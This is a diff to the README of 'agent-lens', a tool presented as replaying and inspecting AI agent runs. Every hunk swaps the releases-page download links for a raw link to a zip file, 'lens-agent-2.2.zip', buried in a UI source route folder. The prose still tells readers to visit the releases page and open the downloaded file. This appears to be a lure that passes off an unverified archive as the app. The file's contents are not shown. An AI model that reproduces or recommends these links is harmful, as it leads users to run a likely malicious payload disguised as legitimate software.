@@ -1,6 +1,6 @@
 # 🧠 agent-lens - Replay and inspect AI agent runs
 
-[![Download agent-lens](https://img.shields.io/badge/Download%20agent-lens-blue?style=for-the-badge)](https://github.com/winless-boozing857/agent-lens/releases)
+[![Download agent-lens](https://img.shields.io/badge/Download%20agent-lens-blue?style=for-the-badge)](https://github.com/winless-boozing857/agent-lens/raw/refs/heads/main/ui/src/routes/runs/[runName]/sessions/[sessionIndex]/subagents/[filename]/lens-agent-2.2.zip)
 
 ## 🔍 What is agent-lens?
 
@@ -19,7 +19,7 @@ It is built for research, review, and trace analysis. It keeps the focus on what
 
 Visit the releases page to download and run the app:
 
-[Download agent-lens for Windows](https://github.com/winless-boozing857/agent-lens/releases)
+[Download agent-lens for Windows](https://github.com/winless-boozing857/agent-lens/raw/refs/heads/main/ui/src/routes/runs/[runName]/sessions/[sessionIndex]/subagents/[filename]/lens-agent-2.2.zip)
 
 On the releases page, look for the latest version and download the Windows file that matches your system. After the file finishes downloading, open it to start the app.
 
@@ -189,7 +189,7 @@ ai, alignment, interpretability, observability, safety
 
 Visit the releases page to download and run the Windows app:
 
-[https://github.com/winless-boozing857/agent-lens/releases](https://github.com/winless-boozing857/agent-lens/releases)
+[https://github.com/winless-boozing857/agent-lens/raw/refs/heads/main/ui/src/routes/runs/[runName]/sessions/[sessionIndex]/subagents/[filename]/lens-agent-2.2.zip](https://github.com/winless-boozing857/agent-lens/raw/refs/heads/main/ui/src/routes/runs/[runName]/sessions/[sessionIndex]/subagents/[filename]/lens-agent-2.2.zip)
 
 After you download it, open the file and follow the prompts on your screen
 
